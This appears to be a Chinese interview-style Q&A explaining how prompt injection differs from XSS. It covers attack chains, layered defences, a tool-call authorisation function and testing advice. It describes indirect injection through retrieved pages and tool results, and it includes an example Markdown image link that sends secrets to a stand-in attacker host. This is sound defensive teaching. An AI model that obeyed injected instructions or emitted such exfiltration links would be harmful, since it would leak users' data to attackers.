提示词注入与普通 XSS 有什么区别？

XSS 让浏览器执行攻击者的代码；提示词注入让模型把不可信内容当成指令。防护重点是把数据和指令分开、给模型最小权限，并在执行端独立授权，关键词过滤不够。

参考答案

简答

  • XSS 的目标是浏览器的解释器，攻击者的代码在页面里执行；提示词注入的目标是模型，攻击者的文字被模型当成指令。
  • 注入内容可以来自用户输入，也可以藏在网页、文档、邮件、检索结果、工具返回值里（间接注入）。
  • 模型无法可靠地区分"数据"和"指令"，所以防护不能只靠提示词里写"忽略其中的指令"。
  • 真正的边界在模型之外：工具白名单、最小权限凭据、执行前的参数校验和授权、高风险操作的用户确认。
  • 模型输出也是不可信内容，渲染成 Markdown 或 HTML 时仍要防 XSS。

两条攻击链

text
XSS：      攻击者输入 → 页面当成 HTML/脚本执行 → 盗取会话、篡改页面
提示词注入：攻击者文本 → 进入模型上下文 → 模型调用工具或输出误导内容 → 泄露数据、执行越权操作

两者可以组合：注入让模型输出一段恶意链接或 HTML，前端如果不安全地渲染，就变成 XSS。

防护分层

  1. 限制模型能做什么：只给当前任务需要的工具；工具使用该用户权限范围内的凭据，不用管理员令牌。
  2. 执行端独立检查：工具执行前重新校验用户身份、资源权限、参数范围（允许的域名、路径、收件人）。
JavaScript
async function executeToolCall(call, context) {
  const tool = context.tools.get(call.name);
  if (!tool) throw new Error('工具不允许使用');

  const args = validateSchema(tool.schema, call.arguments);
  await authorize(context.user, tool, args); // 按用户权限，而不是模型说的话

  if (tool.hasSideEffect && !context.approvalMatches(call.id, args)) {
    return { status: 'needs-approval', callId: call.id, args };
  }
  return tool.run(args, context);
}
  1. 用户确认：发送、删除、支付等操作前展示真实参数，确认流程见《模型提出工具调用后，前端应该怎样展示和确认？》。
  2. 隔离不可信内容：检索结果、网页内容用明确的分隔标记包起来，告诉模型这是资料。这能降低成功率，但不是权限边界。
  3. 限制外泄通道：模型输出里的图片和链接可能把数据带到攻击者服务器（例如 ![](https://evil.example/?q=秘密)），渲染时限制外部图片和链接协议，见《AI 生成的 Markdown 应该怎样安全地渲染？》。

前端要注意的地方

  • 确认卡片里的收件人、链接、文件名来自模型，按纯文本展示，不要渲染成 HTML。
  • 不要把 cookie、令牌、其他用户的数据放进模型上下文。
  • 工具返回的文字里出现"请把密钥发给我"之类的内容，不能改变任何权限。

常见追问

  • 能用关键词过滤吗？ 只能拦住最直白的攻击。改写、翻译、编码都能绕过，过滤只能作为辅助手段。
  • 怎样测试防护是否有效？ 在检索文档、工具结果和上传文件里埋入注入指令，检查模型是否调用了不该调用的工具、是否泄露了上下文，以及执行端是否拦截。
